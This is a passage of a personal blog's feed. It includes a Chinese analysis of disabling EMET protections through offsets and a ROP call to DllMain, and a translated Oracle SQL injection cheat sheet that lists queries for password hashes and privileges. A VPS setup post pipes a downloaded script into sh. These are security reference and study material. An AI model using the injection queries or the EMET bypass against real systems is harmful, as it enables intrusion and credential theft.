<p>Offensive Security还发现，EMET5.0把这个全局变量放到了大型结构（比如CONFIG_STRUCT）里的堆里面，大小是0x560 bytes [7]。但是，思路还是一样的，因为还是存在一个位于固定地址0x0AA84C的指针指向CONFIG_STRUCT。作为保护，EMET使用EncodePointer来把指针的值编码了一下，并且每次EMET执行保护的时要检查这个值，就会调用DecodePointer函数来解码它以获得CONFIG_STRUCT的地址。把地址CONFIG_STRUCT+0x558 置零，能够关掉EMET的大部分保护。同时，通过位于CONFIG_STRUCT+0x518的指针，调用没被hook的函数NtSetContextThread，就能关掉EAF和EAF+。</p>

<p>在EMET5.1里面，Offensive Security发现位于0xF2A30的全局变量里面，保存了编码过的指针值，指向一些结构(比如EMETd)[8]。这个EMETd里面有一个指针域，指向CONFIG_STRUCT结构，也就是那个在CONFIG_STRUCT+0x558里保存了全局开关那个，以此作为一层额外的保护层，保护编码过的指针。EMET5.1使用cpuid命令来把返回的结果和编码过的指针值进行异或。想要解码CONFIG_STRUCT，他们使用了emet.dll里位于0x67372的代码，把EMETd解码出来，然后返回解码了的CONFIG_STRUCT的指针。因为那些全局开关（比如CONFIG_STRUCT+0x558）都储存在只读内存页中，Offensive Security找到了一个方法，通过EMET里面没被hook的指针来修改里面的值。他们用了一个没hook的指针指向位于CONFIG_STRUCT+0x1b8的ntdll!NtProtectVirtualMemory函数，来把它标记为可写内存页，所以他们能够把位于CONFIG_STRUCT+0x558的全局开关置零。想要禁用EAF和EAF+，他们用了一个指向NtSetContextThread的没hook指针，然后剩下的就和禁用EMET5.0一样了。</p>

<h2 id="toc_5">结论</h2>

<p>这个新技术使用EMET来禁用EMET保护，非常的可靠并且相比之前的绕过或禁用技巧更加容易利用。这整个技术都能包含到一个简单粗暴的ROP链中。你只需要弄出一个加载GetModuleHandleW的DLL（比如mshtml.dll）的地址，而不需要进程空间里面的完整可读能力。因为emet.dll里面的DllMain函数被导出了，所以绕过已经不需要对应版本来设置地址，它适用于所有版本的EMET（4.1, 5.1, 5.2, 5.2.0.1）。</p>

<p>在EMET的<em>里面</em>，通过可用的内部代码来禁用EMET，给了我们一直全新的攻击思路。定位DllMain并且调用它来关掉EMET的保护，相比一个一个地绕过保护，然后偷偷改掉其中的参数来说，简直轻松加愉快。</p>

<p>鸣谢：Michael Sikorski, Dan Caselden, Corbin Souffrant, Genwei Jiang, and Matthew Graeber</p>

<h2 id="toc_6">附录</h2>

<h3 id="toc_7">EMET的保护</h3>

<p>EMET经过了许多年的迭代，以下对它的功能作一些简短的描述：</p>

<h4 id="toc_8">EMET 1.x， 发布于 2009年10月27日</h4>

<p>Structured Exception Handling Overwrite Protection (SEHOP)：提供对抗重写异常处理句柄的保护。<br/>
Dynamic Data Execution Prevention (DEP)：加强了DEP，使得一些数据类如堆和栈都不能执行。<br/>
NULL page allocation：修复间接引用空指针导致的漏洞<br/>
Heap spray allocation: 防止Heap spray攻击。</p>

<h4 id="toc_9">EMET 2.x， 发布于 2010年9月2日</h4>

<p>Mandatory Address Space Layout Randomization (ASLR)：加强了模块地址的随机化，即使是以前没有使用ASLR进行编译的模块。</p>

<p>Export Address Table Access Filtering (EAF)：普通的shellcode在已加载的模块导出的函数中迭代，来解析关键Windows API。这些通常由kernel32.dll, ntdll.dll和kernelbase.dll导出。EMET使用保存在debug注册器（比如DR0）的硬件断点来停止那些尝试读取这些模块的导出表的动作，并且让EMET验证它是否合法。</p>

<h4 id="toc_10">EMET 3.x， 发布于 2012年5月25日</h4>

<p>从ROPGuard中导入了用于对抗ROP的策略。<br/>
导入库时的检查：防止从UNC路径中导入DLL。<br/>
ROP 策略 - 内存保护检查：保护关键Windows API，类似VirtualProtect，会使得栈被标记为可执行。<br/>
ROP 策略 - 调用检查：防止关键Windows API被通过返回或跳出命令执行；<br/>
ROP 策略 - Stack Pivot：检测是否被进行Stack Pivot攻击。<br/>
ROP 策略 - 模拟执行流：通过手动操作栈注册器来模拟执行，以此检查它是否在没有使用调用命令的情况下调用了Windows API。这被认为是EMET在探测ROP程序。<br/>
仔细设计ASLR：在已加载的模块地址上增加了随机的8位熵。</p>

<h4 id="toc_11">EMET 4.x， 发布于 2013年4月18日</h4>

<p>Deep Hooks:当这个特性开启，EMET会把所有等级的Windows API都hook上。</p>

<p>抗绕过：因为EMET在已经hook的Windows API函数头部放了一个跳出命令，攻击者能够构造一个ROP，能够返回跳出命令之后的代码上。这项保护尝试阻止这一绕过。</p>

<p>禁用函数：默认禁止调用ntdll!LdrHotpatchRoutine函数来防止DEP/ASLR被绕过。也可以添加其他函数。</p>

<p>认证信任：在认证链信任检测步骤，提供更多的检查和验证。一般这只支持IE。</p>

<h4 id="toc_12">EMET 5.x， 发布于 2014年7月31日</h4>

<p>加入Attack Surface Reduction (ASR)：允许添加配置列表来进制特定的应用不允许加载某些模块。</p>

<p>EAF+：类似EAF，它能保护关键模块导出表如kernel32.dll, ntdll.dll和kernelbase.dll。它同时也能探测栈指针是否指向栈外部的某处，或者frame和栈的指针是否一致。</p>

<h2 id="toc_13">参考</h2>

<p>[1] “Inside EMET 4.0” by Elias Bachaalany, <a href="http://recon.cx/2013/slides/Recon2013-Elias%20Bachaalany-Inside%20EMET%204.pdf">http://recon.cx/2013/slides/Recon2013-Elias%20Bachaalany-Inside%20EMET%204.pdf</a><br/>
[2] “Bypassing EMET 4.1” by Jared DeMott, <a href="http://labs.bromium.com/2014/02/24/bypassing-emet-4-1/">http://labs.bromium.com/2014/02/24/bypassing-emet-4-1/</a><br/>
[3] “Bypassing All of The Things” by Aaron Portnoy, <a href="https://www.exodusintel.com/files/Aaron_Portnoy-Bypassing_All_Of_The_Things.pdf">https://www.exodusintel.com/files/Aaron_Portnoy-Bypassing_All_Of_The_Things.pdf</a><br/>
[4] &ldquo;Bypassing EMET 3.5&rsquo;s ROP Mitigations&rdquo; by Shahriyar Jalayeri, <a href="https://github.com/shjalayeri/emet_bypass">https://github.com/shjalayeri/emet_bypass</a><br/>
[5] &ldquo;Bypassing EMET Export Address Table Access Filtering feature&rdquo; by Piotr Bania, <a href="http://piotrbania.com/all/articles/anti_emet_eaf.txt">http://piotrbania.com/all/articles/anti_emet_eaf.txt</a><br/>
[6] &ldquo;Disarming Enhanced Mitigation Experience Toolkit (EMET)&rdquo; by Offensive-Security, <a href="https://www.offensive-security.com/vulndev/disarming-enhanced-mitigation-experience-toolkit-emet/">https://www.offensive-security.com/vulndev/disarming-enhanced-mitigation-experience-toolkit-emet/</a><br/>
[7] &ldquo;Disarming EMET v5.0&rdquo; by Offensive-Security, <a href="https://www.offensive-security.com/vulndev/disarming-emet-v5-0/">https://www.offensive-security.com/vulndev/disarming-emet-v5-0/</a><br/>
[8] &ldquo;Disarming and Bypassing EMET 5.1&rdquo; by Offensive-Security, <a href="https://www.offensive-security.com/vulndev/disarming-and-bypassing-emet-5-1/">https://www.offensive-security.com/vulndev/disarming-and-bypassing-emet-5-1/</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Ideas for Neural Network]]></title>
    <link href="http://yinzo.github.io/14570954925763.html"/>
    <updated>2016-03-04T20:44:52+08:00</updated>
    <id>http://yinzo.github.io/14570954925763.html</id>
    <content type="html"><![CDATA[
<ul>
<li>Use genetic algorithm to evolve the parameters in Neural Network, to make a self-develop algorithm.

<ul>
<li>automatically find and make training set from search engine</li>
<li>the paremeters include:

<ul>
<li>learning rate</li>
<li>iteration times</li>
<li>regularization term \(\lambda\)</li>
<li>activation function</li>
<li>number of hidden layers(units)</li>
</ul></li>
</ul></li>
</ul>

<span id="more"></span><!-- more -->

<ul>
<li>About MCS, maybe we can train a model for fusion method to do the judge.</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Notes for Neural Network]]></title>
    <link href="http://yinzo.github.io/14569378376035.html"/>
    <updated>2016-03-03T00:57:17+08:00</updated>
    <id>http://yinzo.github.io/14569378376035.html</id>
    <content type="html"><![CDATA[
<h2 id="toc_0">Notes:</h2>

<ul>
<li><p>If we set the initial \(\Theta\) be the same, the units in next layer with the same \(x_i\) will get the same result, then all units in the same layer will get the same output. At last, the cost function will also get same cost, so we will update the \(\Theta\) with same step.</p></li>
<li><p>seems \(\delta^{(l)}_{i}\) means the cost of \(i_{th}\) unit in the \(l_{th}\) layer</p></li>
</ul>

<span id="more"></span><!-- more -->

<h2 id="toc_1">Question about MLP:</h2>

<ul>
<li>How to decide the iteration times</li>
<li>How to initialize the weight \(w_i\)

<ul>
<li>solved. random initialized. But still didn&rsquo;t fully understand the formula。</li>
</ul></li>
<li>How to choose the learning rate \(\alpha\)</li>
<li>How to choose the activation function

<ul>
<li>what&rsquo;s the different between sigmoid and other functions.</li>
</ul></li>
<li>How to decision the number of hidden layers and the number of the units in hidden layers

<ul>
<li>simply explained. Mostly take 3 layers, and the hidden layers usually take a fixed number of units.</li>
</ul></li>
<li>What the \(\Delta^{(i)}\) does in the \(\Theta^{(i)}\) updating.</li>
<li>What Back Propagation algorithm does in the training process? It is only used to calculate the partial derivatives of Cost Function that used to update the \(\Theta\)?</li>
<li>Why every article about NN mentions that Perceptron can finish logical operations? Is there some theory about with logical operation we can simulate the human brain or sth?</li>
</ul>

<h2 id="toc_2">My understanding about the process of building a MLP(Multiple Layer Perceptron)</h2>

<p>We can simply divide this into 2 part:</p>

<ol>
<li>Train the \(\Theta\) for the MLP.</li>
<li><p>Use the trained \(\Theta\) to predict the input&rsquo;s classification.</p></li>
<li><p>The second part is much more easier, let&rsquo;s first assume that we already have a set of trained \(\Theta\) , and we are now trying to use these \(\Theta\) to predict a testing samples.</p>

<p><strong>The thing you need to do is just:</strong></p>

<ol>
<li>Multiply the input \(X\) with each layer&rsquo;s \(\Theta\)</li>
<li>Do some small fixed in it (adding bias, choose the most possible option e.t.c.)</li>
</ol>

<p><strong>And you can get the prediction! What an easy job!</strong></p></li>
<li><p>Then, we are now facing the training part</p>

<ol>
<li>First randomly initialized the \(\Theta\). (Why we don&rsquo;t simply use 1 or 0? Read this!)</li>
<li>Build a function that we can calculate the difference between our prediction and the fact. We call it Cost Function, and use it to evaluate our prediction.</li>
<li>Then, take that Cost Function as a measurement, we use a searching algorithm (i.e. Gradient Descents), to find out the best \(\Theta\) which could minimized the Cost.</li>
</ol></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Note for "Thesis - Behavior of Machine Learning Algorithms in Adversarial Environments.pdf"(1)]]></title>
    <link href="http://yinzo.github.io/14545761055440.html"/>
    <updated>2016-02-04T16:55:05+08:00</updated>
    <id>http://yinzo.github.io/14545761055440.html</id>
    <content type="html"><![CDATA[
<h2 id="toc_0">1.1 Motivation and Methodology</h2>

<h4 id="toc_1">Learning approach is well-suited to the scenario when:</h4>

<ol>
<li>The process is too complex to designed for human operator</li>
<li>Requirement of dynamical development</li>
</ol>

<span id="more"></span><!-- more -->

<h4 id="toc_2">An intelligent adversary can:</h4>

<ul>
<li>Alter his approach based on knowledge of the learner&rsquo;s shortcomings</li>
<li>Mislead it by cleverly crafting data to corrupt </li>
<li>Deceive the learning process</li>
</ul>

<h4 id="toc_3">Potential dangers posed to a learning system:</h4>

<ul>
<li>An attacker can exploit the nature of a machine learning system to mis-train it and cause it to fail</li>
</ul>

<h4 id="toc_4">The questions raised by author:</h4>

<ul>
<li>What techniques can a patient adversary use to mis-train or evade a learning system?</li>
<li>How can system designers assess the vulnerability of their system to vigilantly incorporate trustworthy learning methods?</li>
</ul>

<h4 id="toc_5">An algorithm&rsquo;s performance depends on:</h4>

<ul>
<li>The constraints placed on the adversary</li>
<li>The job the algorithm is tasked with performing</li>
</ul>

<p>This raises two fundamental questions:</p>

<ul>
<li>How can we evaluate a learner&rsquo;s performance in adversarial environment?</li>
<li>How to design or select a learner which can be satisfied for its performance in particular environment?</li>
</ul>

<h3 id="toc_6">Example 1.1</h3>

<h4 id="toc_7">How spammer corrupt the learning mechanism:</h4>

<ol>
<li>use information about the email distribution to construct clever attack spam messages</li>
<li>will cause the spam filter to misclassify the user’s desired messages as spam.</li>
<li>to cause the filter to become so unreliable</li>
</ol>

<h3 id="toc_8">Example 1.2</h3>

<h4 id="toc_9">The ANTIDOTE&rsquo;s feature:</h4>

<ul>
<li>Better resistance within the poisoned environment</li>
<li>But Less effective on non-poisoned environment</li>
</ul>

<h3 id="toc_10">Example 1.3</h3>

<h4 id="toc_11">The means to evade the filter:</h4>

<ul>
<li>obfuscating words indicative of spam to human-recognizable misspellings; e.g., “Viagra” to“V1@gra” or “Cialis” to “Gia|is”</li>
<li>using clever HTML to make the content difficult to parse </li>
<li>adding words or text from other sources unrelated to the spam</li>
<li>embedding images that contains the spam message.</li>
</ul>

<h2 id="toc_12">1.2 Guidelines from Computer Security</h2>

<h4 id="toc_13">Author&rsquo;s principles:</h4>

<ul>
<li>Proactively Analysis</li>
<li>Kerckhoffs’ Principle</li>
<li>Conservative Design</li>
<li>Threat Modeling</li>
</ul>

<h3 id="toc_14">Proactive Analysis:</h3>

<p>Proactively find the vulnerabilities of learning system before the it is deployed or widely used.</p>

<h3 id="toc_15">Kerckhoffs&#39; Principle:</h3>

<p>Do not let a system&rsquo;s security rely on secrets. If the secrets are exposed, the system is immediately compromised.</p>

<p>So apply this principle into machine learning, we should assume the adversary is aware of the learning algorithm and can obtain some data used to train the model.</p>

<h3 id="toc_16">Conservative Design:</h3>

<p>When access the security of a system, we should avoid to put limit on adversary&rsquo;s behavior. We should assume that the adversary has the broadest possible powers.</p>

<p>Conversely, though the adversary too powerfully may lead to an inappropriate assessment on the system.</p>

<h3 id="toc_17">Threat Modeling:</h3>

<p>A completely secure system is infeasible. So author qualified the systems with <em>degree of security</em> -—the level of security expected against an adversary based on a <em>threat model</em> with a certain set of:</p>

<ul>
<li>objectives </li>
<li>capabilities</li>
<li>incentives</li>
</ul>

<h4 id="toc_18">To construct a threat model for a particular learning system:</h4>

<ol>
<li>Quantifies the security setting and objectives of that system, to develop criteria to measure success and quantify the level of security offered.</li>
<li>Formalizing the risks and objectives, to identify potential limitations of the system and potential attacks.</li>
<li>Identifies potential adversarial goals, resources and limitations.</li>
</ol>

<h4 id="toc_19">To evaluating a system:</h4>

<ol>
<li>Determining classed of attacks on the system.</li>
<li>Evaluating the resilience of the system against those attacks</li>
<li>Strengthening the system against those classes of attacks.</li>
</ol>

<h2 id="toc_20">1.3 Historical Roadmap</h2>

<p>Some experience of author when developing this thesis, seems irrelevant to the mainstream.</p>

<h2 id="toc_21">1.4 Dissertation Organization</h2>

<p>As the title, no useful informations.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[封装，与协议的分层]]></title>
    <link href="http://yinzo.github.io/14540640657446.html"/>
    <updated>2016-01-29T18:41:05+08:00</updated>
    <id>http://yinzo.github.io/14540640657446.html</id>
    <content type="html"><![CDATA[
<p>TODO： 为何要分层</p>

<p>要理解协议的分层，若是了解编程理念中的『封装』，可能更有助于理解分层的意义。</p>

<p>『封装』，狭义上指的是编写程序时，通过把一些重复操作的代码写成一个单独的函数，这就可以叫做一个简单的封装。</p>

<p>而我对于封装的理解，举个例子，当你忙了一天回到家，站在你的家门口，想要打开你家的房门时，你需要做以下事情：</p>

<pre><code class="language-flow">st=&gt;start: 站在家门口
op1=&gt;operation: 拿出钥匙
op2=&gt;operation: 找到对应的钥匙
op3=&gt;operation: 把钥匙插到锁孔中
op4=&gt;operation: 旋转钥匙
op5=&gt;operation: 拉开门
op6=&gt;operation: 拔出钥匙
end=&gt;end: 开门结束

st-&gt;op1-&gt;op2-&gt;op3-&gt;op4-&gt;op5-&gt;op6-&gt;end
</code></pre>

<span id="more"></span><!-- more -->

<p>步骤很多，对不对。不过这个描述也没错，我们的确需要做出这些步骤才能开门。</p>

<p>但是，我们和别人聊天的时候，你想要告诉别人你昨天很累，回到家马上就睡觉了，你会说『昨天我回到家门口，<strong>掏出钥匙，找到对应的钥匙……</strong>』吗？</p>

<p>我想大部分人都不会的。</p>

<p>我会说『昨天我回到家门口，<strong>打开门</strong>，马上就进到卧室睡觉了』，这实际上就是一个封装，我们把这些步骤封装成了一个『开门』的步骤。</p>

<p>看到这里你可能已经大概感觉到了，封装，实际上是把一些步骤，打包整合，使它变成了更高层次的行为。看到这里，我觉得我们应该停下来，多思考一会儿关于封装的概念，毕竟这个概念对于理解后面的协议分层非常关键，所以，让我们暂时停一下脚步，来观察并思考一下，我们日常生活中，还有哪些东西实际上也是一种封装吧。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[网络协议]]></title>
    <link href="http://yinzo.github.io/14540640466243.html"/>
    <updated>2016-01-29T18:40:46+08:00</updated>
    <id>http://yinzo.github.io/14540640466243.html</id>
    <content type="html"><![CDATA[
<p>连接不同的计算机是非常有必要的，能够大幅度提升工作效率。</p>

<p>比如：一个工作需要经过三个步骤，分别是步骤A/步骤B/步骤C。三个步骤分别由三台不同的计算机A/B/C执行。</p>

<pre><code class="language-flow">com_A=&gt;operation: 计算机A
com_B=&gt;operation: 计算机B
com_C=&gt;operation: 计算机C


com_A-&gt;com_B-&gt;com_C
</code></pre>

<span id="more"></span><!-- more -->

<p>起初，人们使用容量极小的3.5寸盘，带着要处理的数据来到计算机A面前，执行完之后带着数据分别去B和C前进行操作处理，十分的低效。</p>

<pre><code class="language-flow">com_A=&gt;operation: 计算机A
com_B=&gt;operation: 计算机B
com_C=&gt;operation: 计算机C
ip=&gt;inputoutput: 用户数据
op=&gt;inputoutput: 数据输出
ip-&gt;com_A-&gt;com_B-&gt;com_C-&gt;op
</code></pre>

<p>使用网络连接三台计算机之后，用户可以在A处理完数据，直接传递给B和C进行处理，再将处理结果传回A即可。</p>

<pre><code class="language-flow">com_A=&gt;operation: 计算机A
ip=&gt;inputoutput: 用户数据
op=&gt;inputoutput: 数据输出
ip-&gt;com_A-&gt;op
</code></pre>

<p>甚至，进一步的发展之后，用户都拥有了自己的计算机，则用户可以在任意一台连接了A的计算机上，比如自己的电脑，直接将数据传递到A、B、C计算机上处理，而无需离开自己的计算机进行操作。这一步的发展，即是当前的互联网。</p>

<pre><code class="language-flow">com_A=&gt;operation: 任一联网计算机
ip=&gt;inputoutput: 用户数据
op=&gt;inputoutput: 数据输出
ip-&gt;com_A-&gt;op
</code></pre>

<p>但是现实中，计算机不仅只由一家公司开发，不同公司的计算机起初只能与自家的计算机进行连接。不同种的计算机无法进行连接交流。就像语言不通的外国人，无法交流。</p>

<p>于是，为了连接不同种类计算机，我们统一了计算机交流的语言。由此，无论你的结构与其他计算机有多不同，只要能够使用这种统一语言，就能加入到互联网这个大聊天室之中，与任何计算机进行通信交流。</p>

<p>这种统一的语言，就是『协议』。</p>

<p>由于各种机缘巧合，TCP/IP协议成为了世界上主流的网络通信协议。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Notes for "ICMLC2009-FabioRoli.pdf"]]></title>
    <link href="http://yinzo.github.io/14540480758140.html"/>
    <updated>2016-01-29T14:14:35+08:00</updated>
    <id>http://yinzo.github.io/14540480758140.html</id>
    <content type="html"><![CDATA[
<h2 id="toc_0">Understanding:</h2>

<h3 id="toc_1">1. What is adversarial classification? Basic concepts and motivations</h3>

<p>The Classifier which take the adversary actions into account. It can develop according to the adversary actions.</p>

<p>Its motivations is that the classical model cannot perform well in adversarial environments. Because the classical model is build and set up base on the random noise, it&rsquo;s also use for normal random noise environment. But in adversarial environment, the noise it face is adversarial noise, which is generated by adversary on purpose.</p>

<span id="more"></span><!-- more -->

<h4 id="toc_2">Points:</h4>

<ul>
<li>The classical model does not fit well with adversarial tasks</li>
<li>We need adversary-aware classification models</li>
</ul>

<h3 id="toc_3">2. Adversary-aware classification</h3>

<p>The classical model is build for the normal random noise. When facing the adversarial noise, its performance would be <em>significantly degrade</em>, while the adversary-aware model works better.</p>

<h4 id="toc_4">Points:</h4>

<ul>
<li>Classification algorithms should take into account the adversary</li>
<li>Classifier should be adaptive by exploiting any feedback that they can get about adversary&rsquo;s moves</li>
</ul>

<h3 id="toc_5">3. Vulnerability assessment in pattern classification systems</h3>

<p>The hardness of evading the spam classifier is regard as the judging standard of vulnerability assessment in pattern classification systems, which use the <em>minimum numbers of features that needs to be modified to evade classifier</em> to calculate the score.</p>

<h4 id="toc_6">Points:</h4>

<ul>
<li>Classification accuracy is not everything in adversarial tasks</li>
<li>Designer should maximize both accuracy and hardness of evasion of the classifier</li>
</ul>

<h3 id="toc_7">4. Defense strategies</h3>

<p>Basically, the main strategies is to make the evasion too costly for the adversary. We normally implement this by using multiple classifiers with different detect strategies, to add up the cost of evasion.</p>

<p>Also, for the close-source classifiers, we can make the classifiers activate randomly, which make the adversary needs to do much more detection ( \( \Theta(n) = 2^n \) ) , to figure out how the classifier work.</p>

<h4 id="toc_8">Points:</h4>

<ul>
<li>So for we have some state-of-the-art works on defense strategies against specific attacks for specific applications</li>
<li>Defense strategies against different types of attacks for different applications are a matter of on-going research</li>
</ul>

<h3 id="toc_9">5. Conclusions and open research issues</h3>

<p>There is few adversary-aware model, so does the general-purpose methods for vulnerability assessment and defenses against a variety of attacks.</p>

<ul>
<li>models base on various scenes</li>
<li>integrated strategies for defense and vulnerability assessment</li>
<li>put the test into reality but not simply static data sets</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[新建VPS应该做的事情]]></title>
    <link href="http://yinzo.github.io/14602073387108.html"/>
    <updated>2016-04-09T21:08:58+08:00</updated>
    <id>http://yinzo.github.io/14602073387108.html</id>
    <content type="html"><![CDATA[
<ol>
<li><p>创建root密码</p>

<pre><code>passwd
</code></pre></li>
<li><p>安装oh-my-zsh</p>

<p>这里是debian， 所以使用apt-get</p>

<ol>
<li><p>当然，首先，update &amp; upgrade apt-get</p>

<pre><code>apt-get update; apt-get upgrade
</code></pre></li>
<li><p>安装zsh、git、pip</p>

<pre><code>sudo apt-get install zsh git python-pip python-dev
</code></pre></li>
<li><p>安装oh my zsh</p>

<pre><code>wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh
</code></pre></li>
</ol></li>
</ol>

<span id="more"></span><!-- more -->

<ol>
<li><p>更换默认shell为zsh</p>

<pre><code>    chsh -s /usr/bin/zsh
</code></pre>

<p>这个路径不一定，如果不知道，可以使用<code>which zsh</code>来查看zsh位置</p></li>
<li><p>上传.zshrc</p>

<pre><code>scp ~/.zshrc root@*.*.*.*:~/
</code></pre>

<p>此处<code>*</code>为ip地址<br/><br/>
然后就要修改.zshrc了</p>

<ol>
<li>改zsh对应路径</li>
<li>还原插件列表</li>
<li>检查个性化设置如alias</li>
</ol></li>
<li><p>安装shadowsocks</p>

<p>pip install shadowsocks</p></li>
<li><p>建立 /etc/shadowsocks.json</p></li>
<li><p>在 /etc/rc.local 中加入shadowsocks的开启自启动</p>

<pre><code>/usr/bin/python /usr/local/bin/ssserver -c /etc/shadowsocks.json -d start
</code></pre></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[2015暑假]]></title>
    <link href="http://yinzo.github.io/14608288193470.html"/>
    <updated>2016-04-17T01:46:59+08:00</updated>
    <id>http://yinzo.github.io/14608288193470.html</id>
    <content type="html"><![CDATA[
<p><img src="http://ww3.sinaimg.cn/mw690/7d52f1ffgw1evo7tqd6huj21kw16ok59.jpg" alt="晒猫"/></p>

<p>正式开始学习技术以来的第二个暑假了，上一个暑假的效率之高，可能没有什么机遇的话挺难超越的了。</p>

<p>先放一张这次暑假一开始的计划图以及其完成度。<br/>
<img src="http://ww4.sinaimg.cn/large/7d52f1ffgw1evo7tmpg20j20m507i3zp.jpg" alt="暑假计划"/></p>

<span id="more"></span><!-- more -->

<p>接下来一一说明</p>

<ol>
<li>暑假开始，第一个进行的是SmartQQBot的重构。这时已经回到了家中，主要都是在家里的42寸上完成的，效率不算太高，一个星期3K行左右的Python，主要时间花费在程序模块化逻辑的思考，以及优化二次开发流程上。</li>
<li>接下来，开始花了两天的零散时间整理归纳了自己当前（当时）的技能树，里面漏掉了后端部分中的NodeJS枝，不过也不算很熟练，只是基本入门写了个小东西的水平，也就不追加到博文里了。</li>
<li>深入学习Python。这一部分有少量在重构SmartQQBot的时候就开始了，主要使用<a href="http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000">廖雪峰的Python2.7教程</a>以及<a href="https://docs.python.org/2/">Python Documentation</a>，之所以没有标记为完成是因为没有固定的标准，在我看来Python值得我深入的地方还有很多，所以我选择标记为未完成。</li>
<li>预习下学期内容。这个部分其实算是坑掉了，因为到后期时间不多、精力不够（懒）的原因，只看完了《啊哈！算法》并用Python实现了部分算法就没有深入下去了。</li>
<li>深入学习SQL注入。主要使用Drops的大量注入相关文章，配合DVWA手工注入练习。基本了解了SQL注入的一些原理。（盲注还没来得及下手测试）期间在查阅资料的过程中顺手翻译了两篇文章，发到了Drops捞了一笔。标注为未完成的理由同Python。</li>
<li>Cookie-Pot这个项目被我意外的坑掉了。因为在深入了Python和注入之后，发现自己对于前端的内容是越来越不感兴趣了。这样看来我未来的方向里已经排除掉了前端，顶多作为个人爱好再发展发展了。</li>
<li>之后剩余了2周左右的时间，基本都在慢慢看《数学之美》。原本以为两周能看完的，但是里面NLP的部分完全理解需要的概率论知识我都不太记得了，而且课本没带回家，所以进度非常慢，算法理解度也不甚理想。</li>
</ol>

<p>除了以上计划中的内容，我还进行了以下活动</p>

<ol>
<li>暑假刚开始还没回家的两个星期。在学校接了一（两）单前端外包，大概也是因此对前端失去了部分兴趣。</li>
<li>帮一个师兄的项目写了个简易的前端，算是第一次与他人合作进行配合开发。以前都是自己规划自己写后端自己写前端，没有太多与人合作开发的经历。（这个仍在进行）</li>
</ol>

<p>大概就是以上所写的内容了，可能有所遗漏，之后想起来再补充。</p>

<p>啊对了，回学校之后还修证了一下博客的样式;D，新样式简洁多了</p>

<p>总的来说效率算中上，完成度为80%。新的学期也有新的目标，希望能够尽快成长为能够实现自己脑中所有构思的人。</p>

<p><img src="http://ww4.sinaimg.cn/mw690/7d52f1ffgw1evo7to77eaj21kw16o10g.jpg" alt="环境"/></p>

<p>2015.09.02</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Oracle注入速查表]]></title>
    <link href="http://yinzo.github.io/14608288508524.html"/>
    <updated>2016-04-17T01:47:30+08:00</updated>
    <id>http://yinzo.github.io/14608288508524.html</id>
    <content type="html"><![CDATA[
<p><small>本文由Yinzo翻译，转载请保留署名。原文地址：<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet</a></small></p>

<p>注：下面的一部分查询只能由admin执行，我会在查询的末尾以&quot;<strong><code>-priv</code></strong>&ldquo;标注。</p>

<span id="more"></span><!-- more -->

<p>探测版本：</p>

<pre><code>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;
SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;  
SELECT version FROM v$instance;
</code></pre>

<p>注释：</p>

<pre><code>SELECT 1 FROM dual — comment
</code></pre>

<p><em>注: Oracle的SELECT语句必须包含FROM从句，所以当我们并不是真的准备查询一个表的时候，我们必须使用一个假的表名‘dual’</em></p>

<p>当前用户：</p>

<pre><code>SELECT user FROM dual
</code></pre>

<p>列出所有用户：</p>

<pre><code>SELECT username FROM all_users ORDER BY username;
SELECT name FROM sys.user$; — priv
</code></pre>

<p>列出密码哈希：</p>

<pre><code>SELECT name, password, astatus FROM sys.user$ — priv, &lt;= 10g.  astatus能够在acct被锁定的状态下给你反馈
SELECT name,spare4 FROM sys.user$ — priv, 11g
</code></pre>

<p>密码破解：</p>

<p><a href="http://www.red-database-security.com/software/checkpwd.html">checkpwd</a>能够把Oracle8,9,10的基于DES的哈希破解掉</p>

<p>列出权限：</p>

<pre><code>SELECT * FROM session_privs; —当前用户的权限
SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, 列出指定用户的权限
SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, 找到拥有某个权限的用户
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
</code></pre>

<p>列出DBA账户：</p>

<pre><code>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, 列出DBA和对应权限
</code></pre>

<p>当前数据库：</p>

<pre><code>SELECT global_name FROM global_name;
SELECT name FROM v$database;
SELECT instance_name FROM v$instance;
SELECT SYS.DATABASE_NAME FROM DUAL;
</code></pre>

<p>列出数据库：</p>

<pre><code>SELECT DISTINCT owner FROM all_tables; — 列出数据库 (一个用户一个)
</code></pre>

<p>– 通过查询TNS监听程序能够查询到其他数据库.详情看<a href="http://www.jammed.com/%7Ejwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a>。</p>

<p>列出字段名：</p>

<pre><code>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;
SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;
</code></pre>

<p>列出表名：</p>

<pre><code>SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
</code></pre>

<p>通过字段名找到对应表：</p>

<pre><code>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;  
</code></pre>

<p>— 注: 表名都是大写</p>

<p>查询第N行：</p>

<pre><code>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — 查询第9行(从1开始数)
</code></pre>

<p>查询第N个字符：</p>

<pre><code>SELECT substr(‘abcd’, 3, 1) FROM dual; — 得到第三个字符‘c’
</code></pre>

<p>按位与(Bitwise AND)：</p>

